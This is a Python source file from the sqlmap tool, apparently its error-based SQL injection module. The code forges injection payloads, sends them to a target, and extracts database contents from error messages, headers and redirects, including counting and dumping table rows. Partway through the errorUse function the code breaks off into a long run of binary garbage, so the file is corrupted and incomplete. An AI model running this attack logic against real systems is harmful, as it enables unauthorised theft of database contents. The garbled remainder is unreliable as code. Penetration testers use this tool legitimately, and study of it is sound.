#!/usr/bin/env python2

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import extractRegexResult
from lib.core.common import firstNotNone
from lib.core.common import getConsoleWidth
from lib.core.common import getPartRun
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.common import wasLastResponseHTTPError
from lib.core.compat import xrange
from lib.core.convert import decodeHex
from lib.core.convert import getUnicode
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import HTTP_HEADER
from lib.core.exception import SqlmapDataException
from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
from lib.core.settings import MIN_ERROR_CHUNK_LENGTH
from lib.core.settings import MAX_ERROR_CHUNK_LENGTH
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import ROTATING_CHARS
from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from thirdparty import six

def _oneShotErrorUse(expression, field=None, chunkTest=False):
    offset = 1
    rotator = 0
    partialValue = None
    threadData = getCurrentThreadData()
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal and PARTIAL_VALUE_MARKER in retVal:
        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")
        logger.info("resuming partial value: '%s'" % _formatPartialContent(partialValue))
        offset += len(partialValue)

    threadData.resumed = retVal is not None and not partialValue

    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:
        debugMsg = "searching for error chunk length..."
        logger.debug(debugMsg)

        current = MAX_ERROR_CHUNK_LENGTH
        while current >= MIN_ERROR_CHUNK_LENGTH:
            testChar = str(current % 10)

            testQuery = "%s('%s',%d)" % ("REPEAT" if Backend.isDbms(DBMS.MYSQL) else "REPLICATE", testChar, current)
            testQuery = "SELECT %s" % (agent.hexConvertField(testQuery) if conf.hexConvert else testQuery)

            result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))

            if (result or "").startswith(testChar):
                if result == testChar * current:
                    kb.errorChunkLength = current
                    break
                else:
                    result = re.search(r"\A\w+", result).group(0)
                    candidate = len(result) - len(kb.chars.stop)
                    current = candidate if candidate != current else current - 1
            else:
                current = current // 2

        if kb.errorChunkLength:
            hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)
        else:
            kb.errorChunkLength = 0

    if retVal is None or partialValue:
        try:
            while True:
                check = r"(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
                trimCheck = r"(?si)%s(?P<result>[^<\n]*)" % kb.chars.start

                if field:
                    nulledCastedField = agent.nullAndCastField(field)

                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and not any(_ in field for _ in ("COUNT", "CASE")) and kb.errorChunkLength and not chunkTest:
                        extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(field), expression).group(0)
                        if extendedField != field:  # e.g. MIN(surname)
                            nulledCastedField = extendedField.replace(field, nulledCastedField)
                            field = extendedField
                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)

                # Forge the error-based SQL injection request
                vector = kb.injection.data[kb.technique].vector
                query = agent.prefixQuery(vector)
                query = agent.suffixQuery(query)
                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
                injExpression = unescaper.escape(injExpression)
                injExpression = query.replace("[QUERY]", injExpression)
                payload = agent.payload(newValue=injExpression)

                # Perform the request
                page, headers, _ = Request.queryPage(payload, content=True, raise404=False)

                incrementCounter(kb.technique)

                if page and conf.noEscape:
                    page = re.sub(r"('|\%%27)%s('|\%%27).*?('|\%%27)%s('|\%%27)" % (kb.chars.start, kb.chars.stop), "", page)

                # Parse the returned page to get the exact error-based
                # SQL injection output
                output = firstNotNone(
                    extractRegexResult(check, page),
                    extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
                    extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
                    extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
                )

                if output is not None:
                    output = getUnicode(output)
                else:
                    trimmed = firstNotNone(
                        extractRegexResult(trimCheck, page),
                        extractRegexResult(trimCheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
                        extractRegexResult(trimCheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
                        extractRegexResult(trimCheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
                    )

                    if trimmed:
                        if not chunkTest:
                            warnMsg = "possible server trimmed output detected "
                            warnMsg += "(due to its length and/or content): "
                            warnMsg += safecharencode(trimmed)
                            logger.warn(warnMsg)

                        if not kb.testMode:
                            check = r"(?P<result>[^<>\n]*?)%s" % kb.chars.stop[:2]
                            output = extractRegexResult(check, trimmed, re.IGNORECASE)

                            if not output:
                                check = r"(?P<result>[^\s<>'\"]+)"
                                output = extractRegexResult(check, trimmed, re.IGNORECASE)
                            else:
                                output = output.rstrip()

                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):
                    if offset == 1:
                        retVal = output
                    else:
                        retVal += output if output else ''

                    if output and kb.errorChunkLength and len(output) >= kb.errorChunkLength and not chunkTest:
                        offset += kb.errorChunkLength
                    else:
                        break

                    if output and conf.verbose in (1, 2) and not conf.api:
                        if kb.fileReadMode:
                            dataToStdout(_formatPartialContent(output).replace(r"\n", "\n").replace(r"\t", "\t"))
                        elif offset > 1:
                            rotator += 1

                            if rotator >= len(ROTATING_CHARS):
                                rotator = 0

                            dataToStdout("\r%s\r" % ROTATING_CHARS[rotator])
                else:
                    retVal = output
                    break
        except:
            if retVal is not None:
                hashDBWrite(expression, "%s%s" % (retVal, PARTIAL_VALUE_MARKER))
            raise

        retVal = decodeDbmsHexValue(retVal) if conf.hexConvert else retVal

        if isinstance(retVal, six.string_types):
            retVal = htmlunescape(retVal).replace("<br>", "\n")

        retVal = _errorReplaceChars(retVal)

        if retVal is not None:
            hashDBWrite(expression, retVal)

    else:
        _ = "(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
        retVal = extractRegexResult(_, retVal) or retVal

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def _errorFields(expression, expressionFields, expressionFieldsList, num=None, emptyFields=None, suppressOutput=False):
    values = []
    origExpr = None

    width = getConsoleWidth()
    threadData = getCurrentThreadData()

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = NULL if emptyFields and field in emptyFields else _oneShotErrorUse(expressionReplaced, field)

        if not kb.threadContinue:
            return None

        if not suppressOutput:
            if kb.fileReadMode and output and output.strip():
                print()
            elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
                status = "[%s] [INFO] %s: '%s'" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))

                if len(status) > width:
                    status = "%s..." % status[:width - 3]

                dataToStdout("%s\n" % status)

        if isinstance(num, int):
            expression = origExpr

        values.append(output)

    return values

def _errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.chars.space, " ").replace(kb.chars.dollar, "$").replace(kb.chars.at, "@").replace(kb.chars.hash_, "#")

    return retVal

def _formatPartialContent(value):
    """
    Prepares (possibly hex-encoded) partial content for safe console output
    """

    if value and isinstance(value, six.string_types):
        try:
            value = decodeHex(value, binary=False)
        except:
            pass
        finally:
            value = safecharencode(value)

    return value

def errorUse(expression, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(kb.technique)

    abortedFlag = False
    count = None
    emptyFields = []
    start = time.time()
    startLimit = 0
    stopLimit = None
    value = None

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # Set kb.partRun in case the engine is called from the API
    kb.partRun = getPartRun(alias=False) if conf.api else None

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry at a time
    # NOTE: we assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
            count = unArrayizeValue(_oneShotErrorUse(countedExpression, countedExpressionFields))

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "used SQL query returns "
                    infoMsg += "%d %s" % (stopLimit, "entries" if stopLimit > 1 else "entry")
                    logger.info(infoMsg)

            elif count and not count.isdigit():
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warn(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            if isNumPosStrValue(count) and int(count) > 1:
                if " ORDER BY " in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:
                    message = "due to huge table size do you want to remove "
                    message += "ORDER BY clause gaining speed over consistency? [y/N] "

                    if readInput(message, default="N", boolean=True):
                        expression = expression[:expression.index(" ORDER BY ")]

                numThreads = min(conf.threads, (stopLimit - startLimit))

                threadData = getCurrentThreadData()

                try:
                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))
                except OverflowError:
                    errMsg = "boundary limits (%d,%d) are too large. Please rerun " % (startLimit, stopLimit)
                    errMsg += "with switch '--fresh-queries'"
                    raise SqlmapDataException(errMsg)

                threadData.shared.va¡Í$¶qm>ÚlÎ§‰>Š{ *CÏB´7«†—Yz€ğŠ.ıp€¼ã)"€y®Ã[]ÖÑµ¦ı)aö‡İù &*ä¾¶?*ej‹›Ah"0âgÁ¶…¨>zY„7ınQ‰§ İeØ]¦·Du-ªö^)fO®]xK&{«<o)›Åâıh@†A¥àæEêmèé¶{@J†.ïãÓDƒAø]óÚwêÑ1ÙğÊ†Ïò®4Ü6s3¨(Œ{Ğ[0ì:5˜™Òšûı¶#Då±ÚÄ:õÍ\%}¥+|ª/ ^Á¸ŠÈW÷hÔğ&”î‡pU°®&ph«ûˆ\"W+¿˜ï¹Ô(u PZ“§dÔ0 Î2»iÙ”[BË¦:@ÍáeS„†ñŠÙŠ™Ü+”Ğlh8­"<ãVsì\Â‚¹<¨|·Y3
¦v£u–v%ª]"ÙşqÒò˜4Êi¸RSÓô‡Ä1Q€¥P$Àkš¯< a_  d\ygétnr¡|ôæKiò\|Ø4yòE 9œ81»¯òš—ğ–Mö&Öp©q’ÕüŸ®ö.UäÁø^¹õ2½+),æÊ8ö…T¡&
YÉKú2]vfÒ’æŸXÒ%Ş¦Ûš>ÈÈdx,é´^ŸµãB4]Öb†åQÅ×Ó­f}çñ>á.Ôê‡8Œ«òZ1QDÔ)Öˆ¼FÕ|*Œ¡)‡Ui>C†¹EìôÒ±×¾Ğs±ÕËç?KÂ]ğ7{Ñ„^E¥ˆÕºQaO‘{P–Jo
óT2†Ã±¥öQ"L/»Š6ÃfMŠá ı8„ a9´‰f#?›Ntêû<#œ‰ø€·€ür²°G»`} šÃ$mXc,UŞ3ğZƒÅ\¢ËÌiÓ©¢YÏöQÃ¨”3Çpa— 0ûÚ@´¬W @î²­Ç˜Ú7hãõÂ¾§A™A-HTQ«ù'Tq,@U4hòÆÄ—\ÅM"­ê”Ú—ªÂ¾ §dr¹5 3Ó–[?¹\‡æ -Õm”I*öŠ)ÅT,üAÌŠoºa©ŸZl™U	íët#ylEğ 5ëãĞ&#2õb„¥d 4½˜:Ä¨"ÂSúÎÍßŒæ‡§m¾1ê£ƒŸ¶¤ô¡A#½ér(CôøÔÎ¼üVÓş¶}ŒöìåwÑe¡ÙÓ°oŠQA¡Ç·(ö Kãò-ìkuwIóö+0Œ¹±yçåÀÅ´#	éÄ>gÄK¼€/ @UtŠr'Î2§Hy‹AØñşÍK ‘ÆQÖ%‡À<.=Ù¦˜CèçÜã†9›—ÈqÓdÚ9(A±«qWƒÛ´wh¤ê† ö¿(ÈÉì¢[v¼š¶`†”23°½˜ä–\‡@¹Àñs©Ç+ÂQÊÉj!ôÒŠ™>vÎEùøPì^30
l«÷ø6Ó”Ì‹uCï2M)ÔÌÁdğ¬ãSp©¼TÏ8>AÁUÉ…`vÿ ÓÁã7ĞD€ö@âµ¸`¤ªfQ–¯‚ĞXA2ß§T¾ÿùÿÍ·ù–(†õño©|ÏOÊW‹|YÈ×Œ|¬:ùèoä¹{Í§PjËD¤N&˜C¼åÁhÄ“¸ÂÏM®ÈH.’º²Î¿¢¦:2…œÄ–Ö«Nd?ò«ü–7²Ÿy8u°÷'ƒÃÛúÖ-ùúo_¹ÌÈM},_²l.åOçJşì>Ó„tJh›™':u‚À¬³É?+4~wÓ!Éxµ¯Uß[Í¢\LÜI{®¨¡5yb9Ñûöqˆ<j*s7&s@vm¯ı=.£Óş±döÚ¿1%§ùü±%xıO²ºÅN
”C­ïb¿ˆ.¿Ì	ºÅÏÁ±Õ¾,ø“ñÑTˆ²jî2˜çÔK½¶œ.ÿˆÓoÖ¢ Î ÄÅ 
Z€«.·„ç0¦ò]ålç|»ËMnÀ9ÎUf )áÕ?çnóÀ¤ø>UĞQçë²ãÎK2á
çe7áàœ½² ƒÎ_Í ß=¼gòİ<ÇbRD<6¥¿Dö&VÉß‹bm*|¶ìn,6_:>[©bÎ–ãUş‹T	‡•ÿrõ½W…Rù¿¤¾?Vá?S~9oÛbRş÷d¼Ò+»()pEÜ’Çã*¦ÕércæÉ2âÃê{®*k—ÊUáÇTïâWªˆ›TÄ]nÄı°?şÍò`ª|Å„î%Áõ¾™î×X¿İˆZî˜_ÿ©*ç÷n9o¨
ş)#&ü*b"¤ŠÌ|ÌâÒ‰rwíãĞÆš)‹ãÛ]|åø™X+KœQá{İ¨ˆ˜Šø€qƒšÂ‰ÛåŠY:q[×J,­¹ªõO¨œßqsÊ½¶â2 >ñt\s4E:Ì«íh¡YŒ²Ë–ÑşYäsozZ1F³ôèûĞÍ&Ó	šÉÉÆ6›sªäQH]ı™RÍ½İşL|ÒÎM¨]ÊêA[YÇ6q'£ ÛıA¦=.æ]mùJŠîË«zè3ÿî¿ÿK[Îùù¿Zş)è!Í–²>°øÎe™¼szç‚Èà™:‹°Î¥ˆÌIŠì² +÷FâB/§K#"EÆ¥,wT`;Å)’·2ò„¨ËÜ,ûc7Ûòë‘èöêb®T–O
qğ¦ƒC¤{·HØğaûA3Ã%ELû‹à´+Üµœë‡Œ}:Íõ‡ÕÙ)¾?_`ŸdãÀV…Ú/'…€·ÒÆÏ’À„O¶OÆáÎ—Ñ”×@œoŠk¸½¸_Åê©A°[úL.’ˆF*Ø+¦'8h !‹Èë­LœìÍ6Æ<‘‰|§ÇÔ]ÏFÑyğTá¬q†Ü³†°Şb =›BXû€ÛcDÛ·B;bÁÌZkw”Î–+/‘KT—8’4M@¸µµ)Ul1ŒRWœ)Û¹0!Å‘í\œğä8GL&+ T
ã&ë7°P•%ñ•<CŠƒ`à«œ›i˜{|‰©¨wî ¤lç“ÔeKi§a†kœ/0¬¢¶÷¨áKKH@'Ûr¾AYìíí–Rë<OC^$ñ[ëüD†‰_Ÿ@»<)Mµów
9ƒ§Z“Ó\Íln‹»†x¸êdu,ç„,e§ÎRk§ù$-Cú§¶-¶pJHMlåœ”kÓ	¹ÎRÛC!óÕˆw§Aúb·œ&¬Ú:À©:Ğ"ÜÚBài3¡\SÈ2GÚX…ı1ôØ•¦.u4*@S‡«¥+Cò&³b7»Zèn¯YDÌrä*³\b7ãAjÆØ‚44à‰I°Ÿ÷‰>¯µöm¡ïÊ¾…DDnğB%>U!“ı†’õi 
õ©)äş}ÒÖ +m<„ÚàG^<(­‚z¨¼8^`²Ò“ÇO)ˆ—S}DfËÑ$4­$Ş@@®
ûßí²»ßL¤€’AQ¼—ğ¾D‚N]*ŞpKí#ÅF ø-@ÿM^
²»†ñ@Šh?ƒÊ®Å"oÆ`E˜…ë;>îÕ˜í@Yò_5&«3©1{ÍÌ¤“3`ßN“Ÿ©Ë+—éšPdP‰L±5c˜'5!÷K!lã®4É|EëšçÜ5’dBİ³náš®À±Êv+‹¯”šçpŞ3–¾O0ñ°~d×èÙ#rò„’ÚÅ¶}éG~¸tÓ–×šÏÛ/úæŸ÷â;ãì3÷³†¨e}äà¥õRéX6¾)öe¬±¯n—ßë›²Ù7°ÌMÚ‹uD8dør¡Ï–--!äØw÷Û¿¶ï„DÄ§"Š,[¤GË¤,I¹­ƒ>EP´êP:IçHTcÁc¢§Å0.´C• Ã!ÆÂ'öûM€ü‘éË´CRTĞİ“! ­Ÿ"¶g=v8¨`PøÎl7•‚ÌV‚sĞ²¤òAóò£e¥¸³$Gª\ Ù¸X Ÿr1hŒ)å"ß†z¯¸îù©òÊÄ¾N#²å.!JÃôùŠ51C4D¦Ø¾’BÙ&#© ÌCßU„Jô±Ü	³2I07İi·ŠøÈíŠ°~G‚„î‡L3¿§µé€ìËdÌCi¹ÔÚ÷àZC€‹™™s·—\ë!õp®¨RôÑvû^œv;ÌALdö¨ŒRì7ÖpaÆ'{‹$K@HÑ¦Ki‹3êâ—|jçınHP†Ô87MISåÜ9%¤Òyè„G§„´:O¹!a2Ïù¾’ëcö‡åüŠrfi4«ÃœjŒó]û>Œğã¹¼ò *º!Ï1DY¡1¶•P˜°yÊˆašò¾Ñ¡LT³	½ÓDtO+ÒXb¯PZ_~¿C†ğé©Å™œ¯'å¯6)CştNL–ûŸ%ËûÏ’ı‡•æLIVœ?¥»…*…»uc~úÉ†¦àÔiõ„rXÀßú emÔşˆ}¿zl´ƒwrXnÀôÈ¡RÜS´@2ÊŠ}]*{&®Ï IIí]^§Bp5[Ø÷kÆ
ˆ2%´Æh¤³ÀH?¤-ĞCAùÙDGĞîÛ[ï6Ş7cGjÿ)»fÔÚĞr‹İán¼U(z©&:Å˜f,ÓÊYå78Ö\‹TŸwSu"ÕĞ>ûFÍ¨¯Šœ…'`nì[nâ&pdÙå*_È/¹	ZÕµS"ÁÙö'âU7EËäõØØK ¬	În%ª'çUpƒ
ÉÔæ1 !±% .ˆmCàšj¸V^ÂóíëíOR-ñÌ“´ƒMñµÄì ˆJq–-f(•t–¹QG§D•AJ«Ğ 	Ûo³A½A@ÉÕ\¯x_dÕáKuOíµ?E„u|½YŒ+Ö: Öq_JÄ@zªımıP°?0j…ol®×™üª›Ğ•óİ®4OîÊ0È¤"àuE8)ìëQÙ-Z%ì‡á,B{eÔ‡§D•¡—›°òøÊøfÕN–ÇŠßÂD{}üNÓO{ÍÔ.;~ŸÛ–u^@å½€`¬ß0Ÿ%AXÅøn0ë: °Iƒ3×~º Oš¹,Öè,ğ17âMg¦“)ÿ¤Ù4³–ú<:&şc‰ş²,œyÅé€¢ñ×LÚL× /Rå™ê±b(şW“sâÿh`Ç@ü=.ŞbßëÏNò÷˜IxËiŸ´¾üDíå+nßë«é~ÿë7Ş÷Ì–7¼µİ~˜¡&Ø!/»Jû[šÑq›t Û,9^/Ú®LìaÂiq±«>Ì#¦°öÀ˜&/5›‚h¸?.%ˆA±åÆ(Ø	­îXĞÀYRîcÊ¸Õ¾búà[Ü`>¦½àİàĞ¤ÔO¸Á¹“‚_tƒ³'ÿÆÎœTö_İà•º1CªÉR@¹´ÿÂJZˆ;ÜŠáôgèÑö§qºæ»EÌ`.fšDÇªq-Ã\rÅ½ÌuÆ˜"&u#ÑõKoØ¬9hKé|Qå‹d;ë’†&Ñ+ç®iÇÀù¼™ü´œüS78?yhˆüUÁåè—ü7¸ w
™npVrÙ±º¤ÙP²‰´~c¦Œp£­äªckÜàâIÁgOZÖ;Ä¼à¾ØQBj”M«±ëq÷õ